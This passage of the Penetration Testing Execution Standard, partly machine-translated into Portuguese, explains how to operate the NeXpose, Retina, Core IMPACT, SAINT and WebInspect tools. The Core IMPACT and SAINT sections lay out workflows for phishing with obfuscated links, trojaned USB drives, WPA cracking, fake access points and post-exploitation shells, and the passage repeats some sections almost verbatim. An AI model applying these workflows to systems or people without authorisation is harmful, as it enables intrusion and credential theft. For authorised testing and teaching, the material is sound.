No NeXpose, existem seis guias principais disponíveis: Home, Ativos, Tickets, Relatórios, Vulnerabilidades e Administração. 
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_77.png "Arquivo:Execução de teste de penetração 77.png") 

Para iniciar uma verificação você terá que configurar um 'Novo Site'. Para fazer isso, clique no botão 'Novo Site' na parte inferior da página inicial ou clique na guia Ativos.

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_78.png "Arquivo:Execução de teste de penetração 78.png")

Isso apresentará a página 'Configuração do site - Geral', que contém várias entradas, como nome do site, importância do site e descrição do site. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_79.png "Arquivo:Execução de teste de penetração 79.png")

Digite um nome para o site de destino. Em seguida, adicione uma breve descrição do site e selecione um nível de importância na lista suspensa. O nível de importância corresponde a um fator de risco que a NeXpose utiliza para calcular um índice de risco para cada site. A configuração 'Muito Baixo' reduz um índice de risco para 1/3 do seu valor inicial. A configuração 'Baixo' reduz o índice de risco para 2/3 do seu valor inicial. As configurações 'Alto' e 'Muito Alto' aumentam o índice de risco para 2x e 3x vezes seu valor inicial, respectivamente. Uma configuração 'Normal' não altera o índice de risco. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_80.png "Arquivo:Execução de teste de penetração 80.png") 

Vá para a página *Dispositivos* para listar os ativos do seu novo site. Endereços IP e/ou nomes de host podem ser inseridos manualmente na caixa de texto chamada Dispositivos *para verificar* . Também é possível importar um arquivo separado por vírgula que lista o endereço IP e/ou os nomes de host dos alvos que você deseja verificar. Você precisa garantir que cada endereço/nome de host no arquivo apareça em sua própria linha. 

Para importar um arquivo de lista de destino, clique no botão Procurar ***na** área Dispositivos incluídos* e selecione o arquivo apropriado. 

Se você precisar excluir alvos de uma varredura, o processo será uma amostra; isso é realizado na área denominada ' *Dispositivos a serem excluídos'.*

Depois que os alvos forem adicionados, um modelo de verificação precisará ser selecionado na página ' *Configuração da verificação'* . Para selecionar um modelo de digitalização, basta navegar pelos modelos disponíveis. O menu suspenso do mecanismo de verificação permite que você escolha entre o mecanismo de verificação local e o mecanismo de verificação hospedado Rapid 7. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_81.png "Arquivo:Execução de teste de penetração 81.png") 
Existem muitos modelos disponíveis, mas esteja ciente de que se você modificar um modelo, todos os sites que usam esse modelo de verificação usarão essas configurações modificadas. Portanto, certifique-se de modificar um modelo existente com cuidado. 

Os modelos de verificação padrão Negação de serviço, verificação de descoberta, verificação de descoberta (agressiva), exaustiva, auditoria completa, auditoria DMZ interna, RPMs Linux, hotfix da Microsoft, auditoria da indústria de cartões de pagamento (PCI), teste de penetração, auditoria de rede segura, Sarbanes-Oxley (SOX), auditoria SCADA e auditoria da Web. As configurações específicas para esses modelos estão incluídas no Apêndice D 

Finalmente, se você deseja agendar uma verificação para ser executada automaticamente, clique na caixa de seleção chamada 'Ativar agendamento'. O console exibe opções de data e hora de início, duração máxima da verificação em minutos e frequência de repetição. Se a verificação agendada for executada e exceder a duração máxima especificada, ela será pausada por um intervalo especificado na opção 'Repetir a cada'. Selecione uma opção para o que você deseja que a verificação faça após o intervalo de pausa. 

A verificação recém-agendada aparecerá na coluna 'Próxima verificação' do painel 'Resumo do site' da página do site que você está criando. Todas as verificações agendadas aparecem na página ‘Calendário’, que você pode visualizar clicando no link ‘Calendário mensal’ na página ‘Administração’. 

Você pode configurar alertas para informá-lo quando uma verificação é iniciada, interrompida, falha ou corresponde a um critério específico. 

Do **Alerta; *página e clique no botão ''* Novo Alerta'** . 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_82.png "Arquivo:Execução de teste de penetração 82.png")

O console exibe uma ***caixa de diálogo* Novo Alerta . *Clique na caixa de seleção ''* Habilitar alerta'** para garantir que o NeXpose gere esse tipo de alerta. Você pode clicar na caixa novamente a qualquer momento para desativar o alerta se preferir não recebê-lo temporariamente sem precisar excluí-lo. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_83.png "Arquivo:Execução de teste de penetração 83.png")

Digite um nome para o alerta e um valor no campo ‘Enviar no máximo’ se desejar limitar o número desse tipo de alerta que você recebe durante a verificação. Marque as caixas de seleção dos tipos de eventos (Iniciados, Interrompidos, Com Falha, Pausados ​​e Retomados) para os quais você deseja gerar alertas. Selecione as caixas de seleção Confirmado, Não confirmado e/ou Potencial para receber apenas esses alertas. Selecione um método de notificação na caixa suspensa. NeXpose pode enviar alertas via e-mail SMTP, mensagem SNMP ou mensagem Syslog. Selecione o método de e-mail e insira os endereços dos destinatários pretendidos. Clique na caixa de seleção Limitar texto do alerta para enviar o alerta sem uma descrição do alerta ou sua solução. Clique no botão Salvar. O novo alerta aparece na página ‘Alertas’. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_84.png "Arquivo:Execução de teste de penetração 84.png")

O estabelecimento de credenciais de logon permite verificações mais profundas em uma ampla gama de vulnerabilidades, como violações de políticas, adware ou spyware. Além disso, as varreduras credenciadas resultam em resultados mais precisos. Na página 'Credenciais', clique em 'Novo login' para exibir a caixa 'Novo login'. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_85.png "Arquivo:Execução de teste de penetração 85.png")

Selecione o tipo de credenciais desejado na lista suspensa chamada 'Tipo de login'. Esta seleção determina os demais campos que aparecem no formulário. No campo apropriado, insira o nome de usuário e/ou senha apropriados. Os campos 'Restringir ao dispositivo' e 'Restringir à porta' permitem testar credenciais para garantir que funcionem em um determinado site. Após preencher esses campos, clique no botão ‘Testar login’ para ter certeza de que as credenciais funcionam. Especificar uma porta no campo Restringir à porta permite limitar o intervalo de portas verificadas em determinadas situações. Clique no botão 'Salvar'. As novas credenciais aparecem na página ‘Credenciais’. 

Assim que a verificação for concluída, você poderá visualizar os resultados de várias maneiras. É possível visualizar os ativos por sites, visualizar os ativos por grupos, visualizar os ativos por sistemas operacionais, visualizar os ativos por serviços, visualizar os ativos por software e visualizar todos os ativos. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_86.png "Arquivo:Execução de teste de penetração 86.png")


Ao selecionar a visualização de ativos apropriada, você pode selecionar os resultados que deseja visualizar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_87.png "Arquivo:Execução de teste de penetração 87.png")

Para criar um relatório, clique no botão 'Criar relatório de site'. Isso o levará para a página 'Novo relatório' 'Configuração'. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_88.png "Arquivo:Execução de teste de penetração 88.png")

A configuração do relatório envolve a seleção de um modelo de relatório, ativos para relatório e opções de distribuição. Você pode agendar relatórios automáticos para geração e distribuição após varreduras ou em um calendário fixo; ou você pode executar relatórios manualmente. Depois de passar por todas as etapas de configuração a seguir e clicar em ‘Salvar’, o NeXpose começará imediatamente a gerar um relatório. 
##### **eEYE Retina**
eEye Retina Vulnerability Assessment Scanner é um scanner de vulnerabilidade criado pela eEye Digital Security que é usado para correlacionar e validar descobertas do Nmap e Nessus. 

À primeira vista, a interface parece muito mais complicada que a do Nessus. No entanto, é extremamente simples depois de explorado. A tela inicial apresentada é a página Tarefas de Descoberta. Isso é utilizado para realizar uma varredura de descoberta para determinar quais hosts estão ativos. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_89.png "Arquivo:Execução de teste de penetração 89.png") 

Para realizar uma verificação de descoberta, clique em Alvos na seção Ações e a opção "Selecionar alvos" aparecerá. Neste ponto, você pode inserir um único endereço IP ou nome de host que você avaliar. As outras opções disponíveis são verificar por intervalo de IP, CIDR, host nomeado e grupos de endereços. 

Clicar na seção Opções de ações apresenta opções adicionais relacionadas à verificação de descoberta. Essas opções incluem descoberta de ICMP, descoberta de TCP em portas (insira uma lista separada por vírgulas de números de porta, descoberta de UPD, execução de detecção de sistema operacional, obtenção de DNS reverso, obtenção de nome NetBIOS e obtenção de endereço MAC. Selecione as opções apropriadas para a verificação desejada. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_90.png "Arquivo:Execução de teste de penetração 90.png") 

To run the Discovery scan immediately click "Discover." To run the Discovery scan at a later point in time or on a regular schedule, click "Schedule." Retina displays your results in the Results table as it scans the selected IP(s). In order to get the results in a format that we can use, we need to select the scan results and click "Generate" to export the results in XML format. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_91.png "Arquivo:Execução de teste de penetração 91.png") 

While Discovery Scans may be useful, the majority of our tasks will take place in the Audit Interface. This is very similar to the Discovery Scan interface; however it does have a few more options. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_92.png "Arquivo:Execução de teste de penetração 92.png") 

The Targets section is similar though there is an additional section that allows us to specify the Output Type, Name, and Job Name. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_93.png "Arquivo:Execução de teste de penetração 93.png") 

This section is important to complete, as this is how the scan results will be saved. If you do not change this information then you could potentially overwrite someone else's scan results. By default, these are saved to the following directory:

C:\Program Files\eEye Digital Security\Retina 5\Scans

This is important to note, as you will need to copy these from this location to your working directory. 

At this point we need to click Ports from the Actions section and the "Select Port Group(s)" option will appear. At this point we need to validate that the "All Ports" option has been selected. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_94.png "Arquivo:Execução de teste de penetração 94.png") 

The next section we need to check is "Audits" from the Actions section and the "Select Audit Group(s)" option will appear. At this point we need to validate that the "All Audits" option has been selected. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_95.png "Arquivo:Execução de teste de penetração 95.png") 

The final section we need to check is "Options" from the actions section. Clicking on this will present us with the "Select Options" action section. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_96.png "Arquivo:Execução de teste de penetração 96.png") 

At this point we need to validate that the following option has been selected: 

- Perform OS Detection
- Get Reverse DNS
- Get NetBIOS Name
- Get MAC Address
- Perform Traceroute
- Enable Connect Scan
- Enable Force Scan
- Randomize Target List
- Enumerate Registry via NetBIOS
- Enumerate Users via NetBIOS
- Enumerate Shares via NetBIOS
- Enumerate Files via NetBIOS
- Enumerate Hotfixes via NetBIOS.
- Enumerate Named Pipes via NetBIOS
- Enumerate Machine Information via NetBIOS
- Enumerate Audit Policy via NetBIOS
- Enumerate Per-User Registry Settings via NetBIOS
- Enumerate Groups via NetBIOS
- Enumerate Processes via NetBIOS
- Enumerate a maximum of 100 users

At this point we are ready to actually perform the Audit Scan. Click the Scan button to start the Audit Scan immediately. To perform the scan at a later point in time or on a regular schedule, click "Schedule." 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_97.png "Arquivo:Execução de teste de penetração 97.png") 

*Note:* Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected. 

The results of your scan are automatically saved in .rtd format. 

Retina displays your results in the Results table as it scans the selected IP(s). 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_98.png "Arquivo:Execução de teste de penetração 98.png") 
##### **Qualys**
<Contribution Needed>
##### **Core IMPACT**
Core IMPACT is a penetration testing and exploitation toolset used for testing the effectiveness of your information security program. Core IMPACT automates several difficult exploits and has a multitude of exploits and post exploitation capabilities. 
###### **Core IMPACT Web**
Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. 

[Screenshot Here] 

\1) Information Gathering\. As always, the first step information gathering\. Core organizes web attacks into scenarios\. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications\. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive\. 

With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreWEBcrawl.jpg "Arquivo:CoreWEBcrawl.jpg") 

With interactive, you set your îbrowserî to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. 

[Screenshot Here] 

\2) Web Attack and penetration\. 

The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard. SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz\_strings). Adding information about known custom error pages and any session arguments will enhance testing. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, donít. Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View. 

\3) Web Apps Browser attack\. 

Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. 

\4) Web App Local Information Gathering\. 

Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. 

[Screenshot Here] 

The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. 

\5) Report Generation\. Select from a variety of reports like executive, vulnerability and activity reports\. 

Core Onestep Web RPTs Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator 

Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans. 
###### **Core IMPACT WiFi**
Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Corewireless.jpg "Arquivo: Corewireless.jpg") 

\1) Information Gathering\. Select the channels to scan to discover access points or capture wireless packets\. 

\2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption\. It is also used to gather information for encryption key cracking\. 

\3) Crack Encryption Keys\. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys\. For WPA/WPA2, relevant passwords files from recognizance phase should be used\. 

\4) Man in the Middle client attacks\. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system\. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack\. 

\5) Reporting\. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated\. 
###### **Core IMPACT Client Side**
Core Impact can perform controlled and targeted social engineering attacks against a specified user community via email, web browsers, third-party plug-ins, and other client-side applications. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSrpt.jpg "Arquivo:CoreCSrpt.jpg") 

\1) As always, the first step information gathering\. Core Impact has automate modules for scraping email addresses our of search engines (can utilize search API keys), PGP, DNS and WHOIS records, LinkedIn as well as by crawling a website, contents and metadata for Microsoft Office Documents and PDFs , or importing from a text file generated using source as documented in the intelligence gather section of the PTES\. 2) With the target list complete, the next step is to create the attack\. Core supports multiple types of attacks, including single exploit, multiple exploits or a phishing only attack 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSattacktype.jpg "Arquivo:CoreCSattacktype.jpg") [Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSsingle.jpg "Arquivo:CoreCSsingle.jpg") [Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSmulti.jpg "Arquivo:CoreCSmulti.jpg") [Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSphish.jpg "Arquivo:CoreCSphish.jpg") 

Depending on which option is chosen the wizard will walk you through choosing the exploit, setting the duration of the client side test, and choosing an email template (note: predefined templates are available, but message should be customized to match target environment!) .Web links can be obfuscated using tinyURL, Bit.Ly or Is.gd. After setting the options for the email server the Core Agent connect back method (HTTP, HTTPS, or other port), and choosing whether or not to run a module on successful exploitation or to try to collect smb credentials, the attack will start. Specific modules can be run instead of using the wizard by choosing the modules tab 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Corerptormodules.jpg "Arquivo:Corerptormodules.jpg") 

Monitor the Executed Modules pane to see the progress of the client side attack. As agents are deployed, they will be added to the network tab. See the network RPT section of the PTES for details on completing the local information gathering, privilege escalation and clean up tasks. 

Once the client side attack is complete, detailed reporting of the client side phishing/exploitation engagement can be generated. 

It is also possible to create a trojaned USB drive that will automatically install the Core agent. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:CoreCSusb.jpg "Arquivo:CoreCSusb.jpg") 

###### **Core Web**
Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications. [Screenshot Here] 

\1) Information Gathering\. As always, the first step information gathering\. Core organizes web attacks into scenarios\. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications\. a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT b) Choose a method for exploring the site, automatic or interactive\. 

`   `With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters.
###### **coreWEBcrawl**
With interactive, you set your ”browser” to use Core as a proxy and then navigate through the web application. Further customized discovery modules like checking for backup and hidden pages are available on the modules tab. [Screenshot Here] 

\2) Web Attack and penetration\. The attack can be directed to a scenario or individual pages\. Each type of exploit has its own configuration wizard\. SQL Injection tests can be performed on request parameters and/or request cookies\. There are three different levels of injection attacks FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz\_strings)\. Adding information about known custom error pages and any session arguments will enhance testing\. For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities\. For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, don’t\. Monitor the module progress in the Executed Modules pane\. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View\. 

\3) Web Apps Browser attack\. Can leverage XSS exploits to assist with Social Engineering awareness tests\. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase\. 

\4) Web App Local Information Gathering\. Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited\. Command and SQL shells may also be possible\. [Screenshot Here] The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent\. 

\5) Report Generation\. Select from a variety of reports like executive, vulnerability and activity reports\. 
###### **Core Onestep Web RPTs**
Core also has two one-step rapid penetration tests 1) WebApps Vulnerability Test Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 2) WebApps Vulnerability Scanner Validator Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans. 
###### **Core WiFi**
Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. In order to use the wireless modules you must use an AirPcap adapter available from www.cacetech.com. <corewireless.jpg> 1) Information Gathering. Select the channels to scan to discover access points or capture wireless packets. 

\2) Wireless Denial of Service The station deauth module can be used to demonstrate wireless network disruption\. It is also used to gather information for encryption key cracking\. 

\3) Crack Encryption Keys\. Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys\. For WPA/WPA2, relevant passwords files from recognisance phase should be used\. 

\4) Man in the Middle client attacks\. Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system\. Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack\. 

\5) Reporting\. Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated\. 
##### **SAINT**
SAINT Professional is a commercial suite combining two distinct tools rolled into one easy to use management interface; SAINTscanner and SAINTexploit providing a fully integrated vulnerability assessment and penetration testing toolkit. 

SAINTscanner is designed to identify vulnerabilities on network devices, OS and within applications. It can be used for compliance and audit testing based on pre-defined and custom policies. In addition as a data leakage prevention tool it can enumerate any data that should not be stored on the network. SAINTexploit is designed to exploit those vulnerabilities identified by SAINTscanner, with the ability to carry out bespoke social engineering and phishing attacks also. One a host or device has been exploited it can be utilised to tunnel through to other vulnerable hosts. SAINT can either be built from source or be run from a pre-configured virtual machine supplied by the vendor. If the latter is used (recommended) simply double clicking the icon will launch the suite. By default the password is “SAINT!!!” The default web browser opens after SAINT auto updates to the following URL: http://<IP ADDRESS>:52996/ Screenshot Here SAINT\_startup.png refers (included). 
###### **SAINTscanner**
Once logged in you immediately enter the SAINTscanner page with the Penetration Testing (SAINTXploit) tab easily available and visible. It is possible to login remotely to SAINT, by default this is over port 1414 and has those hosts allowed to connect have to be setup via Options, startup options, Category remote mode, subcategory host options: Screenshot Here SAINT\_Remote\_host.png refers (included). Configuration of scanning options should now be performed which is accessed by Options, scanning options, Category scanning policy. Each sub category needs to be addressed to ensure that the correct default scanning parameters are set i.e. using nmap rather than the in-built SAINT port scanner and which ports to probe, that dangerous checks are disabled (if required) and that the required items for compliance and audit are enabled for reporting i.e. anti-virus, age of definition check etc. Screenshot Here SAINT\_scanning\_options.png refers (included). Note: - The target restrictions sub-category should be amended if any hosts are not to be probed. The most import scanning option is Category Scanning policy, sub-category probe options, option, what scanning policy should be used, the scan required is selected or a custom policy built-up to suit the actual task Screenshot here SAINT\_policy\_setup.png refers (included). Having configured all the options required the actual process of carrying out a scan can be addressed. Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials Screenshot here SAINT\_scansetup1.png refers (included). Step 3 Select Scan Policy Type Step 4 Determine Firewall settings for Target Step 5 Select Scan Now Screenshot here SAINT\_scansetup2.png refers (included). 
###### **SAINTexploit**
Different levels of penetration tests can be carried out: 

Discovery - Identify hosts. Information Gathering - Identify hosts, probe and port scan. Single Penetration - Both above then exploits stopping at first successful exploit. Root Penetration - Exploit then Privilege escalation to admin/ root. Full Penetration - Exploits as many vulnerabilities as possible. Web Application - Attacks discovered web applications. 

Conducting a test is fairly straight forward, once any prior configuration has been carried out, callback ports, timeouts etc. Just select the Pen Test icon then go through the following 4 steps. Once complete select run pen test now. 

Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in credentials 

Screenshot here SAINT\_pen1.png refers (included). 

Step 3 Select Penetration Test Type Step 4 Determine Firewall settings for Target 

SAINT\_pen2.png Screenshot here SAINT\_pen2.png refers (included). 

Depois que um host tiver sido explorado com êxito, navegar até a guia conexões fornece a capacidade de interagir diretamente com a sessão. SAINTexploit fornece quatro ferramentas úteis nesta guia para permitir acesso interativo à sessão e um botão de desconexão para fechar qualquer conexão pendente: 

Prompt de comando. Gerenciador de arquivos e uploads. Túnel do capturador de capturas de tela. 

Captura de tela aqui refere-se a SAINT\_connections.png (incluído) O Gerenciador de arquivos oferece a capacidade de executar inúmeras ações. Ele é aberto na guia conexões, oferecendo a capacidade de fazer upload/download/renomear arquivos. Captura de tela aqui refere-se a SAINT\_filemgr.png (incluído) Um prompt de comando pode ser utilizado em um host explorado, a ferramenta é aberta por meio da guia de conexões, todos os comandos do tipo DOS/Bash aplicáveis ​​ao sistema operacional de destino podem ser executados. Captura de tela aqui refere-se a SAINT\_cmd.png (incluído) A ferramenta de captura de tela pode ser usada contra um host explorado para capturar uma captura de tela para o relatório. A captura de tela aqui SAINT\_screen.png refere-se (incluída) Várias outras ferramentas que podem ser utilizadas contra o host, ou seja, capturar hashes de senha e muitas outras podem ser acessadas e executadas através do ícone de exploits, opção de ferramentas. 

Ataques personalizados do lado do cliente Eles podem ser executados usando o ícone de exploits, selecionando exploits, expandindo a lista de clientes e clicando no exploit apropriado que você deseja utilizar contra o cliente (execute agora) Captura de tela aqui SAINT\_client1.png refere-se (incluído) Selecione , porta à qual o cliente deve se conectar, a porta do shell e o tipo de destino. Anote qualquer e-mail específico de e para parâmetros Captura de tela aqui SAINT\_client2.png refere-se (incluído) Digite o assunto, selecione um modelo predefinido e altere a mensagem para se adequar Captura de tela aqui SAINT\_client3.png refere-se (incluído) Um modelo predefinido de amostra está disponível que parece muito realista Captura de tela aqui SAINT\_client4.png refere-se (incluído) Selecionar executar agora iniciará o servidor de exploração no host de destino especificado Captura de tela aqui SAINT\_client5.png refere-se (incluído) Se um cliente clicar no link do e-mail que acabou de ser enviado, e eles são exploráveis, o host aparecerá na guia de conexões e poderá interagir como acima. 
###### **SAINT escritor**
SAINTwriter é um componente do SAINT que permite gerar uma variedade de relatórios customizados. SAINTwriter apresenta oito relatórios pré-configurados, oito formatos de relatório (HTML, HTML sem moldura, HTML simples, PDF, XML, texto, texto separado por tabulações e texto separado por vírgula) e mais de 100 opções de configuração para relatórios personalizados. 

Para gerar um relatório 

Passo 1 Na GUI do SAINT, vá para Dados e, de lá, vá para SAINTwriter. Passo 2 Leia as descrições dos relatórios pré-configurados e selecione aquele que melhor atende às suas necessidades. Captura de tela aqui refere-se a SAINT\_writer.png (incluído). Um exemplo de relatório está disponível aqui e aqui SAINT\_report1.pdf e SAINT\_report2.pdf consulte (incluído) 
#### **Verificadores de aplicativos da Web**
##### **Verificadores gerais de aplicativos da Web**
###### **WebInspect (Windows)**
A ferramenta de avaliação de segurança de aplicativos WebInspect da HP ajuda a identificar vulnerabilidades conhecidas e desconhecidas na camada de aplicativos da Web. O WebInspect também pode ajudar a verificar se um servidor Web está configurado corretamente e tenta ataques comuns da Web, como injeção de parâmetros, scripts entre sites, passagem de diretório e muito mais. 

Ao iniciar o WebInspect pela primeira vez, o aplicativo exibe a página inicial. Para esta página, podemos executar as cinco funções principais na GUI do WebInpsect. As opções são iniciar uma avaliação de site, iniciar uma avaliação de serviço web, iniciar uma avaliação empresarial, gerar um relatório e iniciar o Smart Update. Na página inicial, você também pode acessar as verificações abertas recentemente, visualizar as verificações agendadas para hoje e, por fim, visualizar as mensagens do WebInspect. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_99.png "Arquivo:Execução de teste de penetração 99.png") 

A primeira verificação executada com o WebInspect é a verificação de avaliação do site. O WebInspect usa o Assistente de avaliação de novo site para configurar as varreduras de avaliação. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_100.png "Arquivo:Execução de teste de penetração 100.png") 

Quando você inicia o assistente de Nova Verificação, a janela Assistente de Verificação é exibida. As opções exibidas nas janelas do assistente são extraídas das configurações padrão do WebInspect. O importante a observar é que quaisquer alterações feitas serão usadas apenas para esta verificação. 

Na caixa Nome da verificação, insira um nome ou uma breve descrição da verificação. Em seguida, você precisa selecionar um modo de avaliação. As opções disponíveis são Somente rastreamento, Rastreamento e auditoria, Somente auditoria e Manual. A opção "Somente rastreamento" mapeia completamente a estrutura em árvore de um site. É possível, após a conclusão de um rastreamento, clicar em "Auditoria" para avaliar as vulnerabilidades de um aplicativo. "Rastreamento e Auditoria" mapeia a estrutura hierárquica de dados do site e audita cada página à medida que ela é descoberta. Isto deve ser usado ao avaliar locais extremamente grandes. "Somente auditoria" determina vulnerabilidades, mas não rastreia o site. O site não é avaliado quando esta opção é escolhida. Finalmente, o modo “Manual” permite navegar manualmente pelas seções do aplicativo. Ele não rastreia o site inteiro, mas registra informações apenas sobre os recursos que você encontra ao verificar um site navegando manualmente no site. Use esta opção se houver varreduras credenciadas sendo executadas. Além disso, certifique-se de incorporar as credenciais nas configurações do perfil. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_101.png "Arquivo:Execução de teste de penetração 101.png") 

Recomenda-se rastrear primeiro o site do cliente. Isso permite a oportunidade de identificar quaisquer formulários que precisam ser filtrados durante a auditoria, bem como identificar diretórios/nomes de arquivos (em alguns casos, até mesmo o criador de perfil) que precisam ser ignorados para que uma verificação seja concluída. 

Depois de selecionar o modo de avaliação, você precisará selecionar o tipo de avaliação. Existem quatro opções disponíveis: Avaliação Padrão, Avaliação Orientada por Lista, Avaliação Manual e Avaliação Orientada por Fluxo de Trabalho. O tipo de Avaliação Padrão consiste em análise automatizada, a partir da URL de destino. Esta é a maneira normal de iniciar uma varredura. A Avaliação Manual permite que você navegue manualmente para 

quaisquer seções do seu aplicativo que você escolher visitar, usando o Internet Explorer. A Avaliação Orientada a Lista executa uma avaliação usando uma lista de URLs a serem verificados. Cada URL deve ser totalmente qualificado e incluir o protocolo (por exemplo, http:// ou https://). Avaliação orientada por fluxo de trabalho: o WebInspect audita apenas os URLs incluídos na macro que você gravou anteriormente e não segue nenhum hiperlink encontrado durante a auditoria. 

Conforme discutido anteriormente, a Avaliação Padrão normalmente será usada para as varreduras iniciais. Se esta for a opção que você selecionou, você precisará digitar ou selecionar o URL completo ou endereço IP do site do cliente a ser examinado. Quando você insere um URL, ele deve ser preciso. Por exemplo, se você inserir client.com não resultará na verificação de www.client.com ou qualquer outra variação. Para digitalizar a partir de um ponto específico, anexe um ponto inicial para a verificação, como <http://www.client.com/clientapplication/> . Por padrão, as verificações realizadas por endereço IP não seguirão links que usam URLs totalmente qualificados. 

